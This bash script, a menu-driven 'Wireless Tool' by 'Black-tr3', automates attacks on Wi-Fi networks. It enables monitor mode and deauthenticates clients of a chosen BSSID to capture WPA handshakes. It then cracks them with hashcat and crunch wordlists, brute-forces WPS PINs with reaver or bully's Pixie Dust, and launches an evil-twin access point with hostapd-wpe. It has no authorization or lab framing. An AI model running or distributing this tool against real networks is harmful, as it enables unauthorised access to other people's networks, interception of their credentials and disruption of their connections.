#!/bin/bash
set -euo pipefail

# ============================================
# Black-tr3 Wireless Tool
# ============================================
VERSION="1.0"
AUTHOR="Black-tr3"
TOOL_NAME="Wireless Tool"

# Colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
NC="\e[0m"

# Directories
HANDSHAKE_DIR="handshakes"
WORDLIST_DIR="wordlists"

# Ensure necessary directories exist
mkdir -p "$HANDSHAKE_DIR" "$WORDLIST_DIR"

# ============================================
# Helper Functions
# ============================================

# Check for required dependencies
check_dependencies() {
    echo -e "${YELLOW}Checking dependencies...${NC}"
    REQUIRED_TOOLS=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "hcxdumptool" "hashcat" "crunch" "iw" "awk" "xterm" "ip" "lspci" "ps" "bettercap" "ettercap" "dnsmasq" "hostapd-wpe" "beef-xss" "bully" "nft" "pixiewps" "dhcpd" "asleap" "packetforge-ng" "wpaclean" "hostapd" "tcpdump" "etterlog" "tshark" "mdk4" "besside-ng" "wash" "hcxdumptool" "reaver" "hcxpcapngtool" "john" "crunch" "lighttpd" "openssl" "curl")

    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[-] $tool is missing. Installing...${NC}"
            apt-get install -y "$tool" || echo -e "${RED}Failed to install $tool. Please install it manually.${NC}"
        else
            echo -e "${GREEN}[✓] $tool is installed.${NC}"
        fi
    done
}

# Enable Monitor Mode
enable_monitor_mode() {
    echo -e "${YELLOW}Enabling Monitor Mode...${NC}"
    airmon-ng check kill
    for iface in $(iw dev | awk '$1=="Interface"{print $2}'); do
        ip link set "$iface" down
        iw dev "$iface" set type monitor
        ip link set "$iface" up
        echo -e "${GREEN}[✓] Monitor Mode enabled on $iface.${NC}"
    done
}

# Enable Managed Mode
enable_managed_mode() {
    echo -e "${YELLOW}Enabling Managed Mode...${NC}"
    airmon-ng check kill
    for iface in $(iw dev | awk '$1=="Interface"{print $2}'); do
        ip link set "$iface" down
        iw reg set BO
        iw dev "$iface" set type managed
        ip link set "$iface" up
        systemctl restart NetworkManager
        echo -e "${GREEN}[✓] Managed Mode enabled on $iface.${NC}"
    done
}

# Scan Networks
scan_networks() {
    echo -e "${YELLOW}Scanning for available networks...${NC}"
    airodump-ng wlan0
}

# Capture Handshake
capture_handshake() {
    read -p "Enter target BSSID: " BSSID
    read -p "Enter target channel: " CHANNEL
    CAPTURE_FILE="${HANDSHAKE_DIR}/${BSSID}.cap"

    echo -e "${YELLOW}Capturing handshake for $BSSID on channel $CHANNEL...${NC}"
    airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$CAPTURE_FILE" wlan0 &
    sleep 15
    aireplay-ng --deauth 10 -a "$BSSID" wlan0
    echo -e "${GREEN}[✓] Handshake saved as $CAPTURE_FILE${NC}"
}

# Generate Wordlist
generate_wordlist() {
    read -p "Enter wordlist filename: " WORDLIST_NAME
    read -p "Enter min length: " MIN_LEN
    read -p "Enter max length: " MAX_LEN
    crunch "$MIN_LEN" "$MAX_LEN" -o "${WORDLIST_DIR}/${WORDLIST_NAME}.txt"
    echo -e "${GREEN}[✓] Wordlist saved as ${WORDLIST_DIR}/${WORDLIST_NAME}.txt${NC}"
}

# Convert Handshake to Hashcat Format
convert_handshake() {
    read -p "Enter handshake filename: " HANDSHAKE_FILE
    HASH_FILE="${HANDSHAKE_FILE}.hc22000"
    hcxpcapngtool -o "$HASH_FILE" "$HANDSHAKE_FILE"
    echo -e "${GREEN}[✓] Converted handshake saved as $HASH_FILE${NC}"
}

# Crack Handshake
crack_handshake() {
    read -p "Enter hash file: " HASH_FILE
    read -p "Enter wordlist: " WORDLIST
    hashcat -m 22000 "$HASH_FILE" "$WORDLIST" --status --status-timer=5
}

# WPS Attack
wps_attack() {
    read -p "Enter target BSSID: " BSSID
    read -p "Enter interface: " IFACE
    read -p "Attack method (1) PIN brute-force or (2) Pixie Dust: " METHOD
    if [[ "$METHOD" == "1" ]]; then
        reaver -i "$IFACE" -b "$BSSID" -vv
    else
        bully -b "$BSSID" -c 1 -i "$IFACE" --pixiewps
    fi
}

# Evil Twin Attack
evil_twin_attack() {
    read -p "Enter target network name (SSID): " SSID
    FAKE_SSID="${SSID}_Fake"
    echo -e "${YELLOW}Setting up Evil Twin attack for $SSID...${NC}"
    hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf &
    echo -e "${GREEN}[✓] Fake AP ($FAKE_SSID) is active.${NC}"
}

# Main Menu
main_menu() {
    while true; do
        echo -e "${BLUE}-----------------------------------"
        echo -e "  $TOOL_NAME - v$VERSION"
        echo -e "  Author: $AUTHOR"
        echo -e "-----------------------------------${NC}"
        echo -e "${GREEN}1) Install/Update Dependencies"
        echo -e "2) Enable Monitor Mode"
        echo -e "3) Enable Managed Mode"
        echo -e "4) Scan Networks"
        echo -e "5) Capture Handshake"
        echo -e "6) Generate Wordlist"
        echo -e "7) Convert Handshake"
        echo -e "8) Crack Handshake"
        echo -e "9) Attack WPS Network"
        echo -e "10) Evil Twin Attack"
        echo -e "11) Exit${NC}"
        read -p "Select an option: " choice
        case $choice in
            1) check_dependencies ;;
            2) enable_monitor_mode ;;
            3) enable_managed_mode ;;
            4) scan_networks ;;
            5) capture_handshake ;;
            6) generate_wordlist ;;
            7) convert_handshake ;;
            8) crack_handshake ;;
            9) wps_attack ;;
            10) evil_twin_attack ;;
            11) exit 0 ;;
            *) echo -e "${RED}Invalid option. Try again.${NC}" ;;
        esac
    done
}

# Run main menu
main_menu
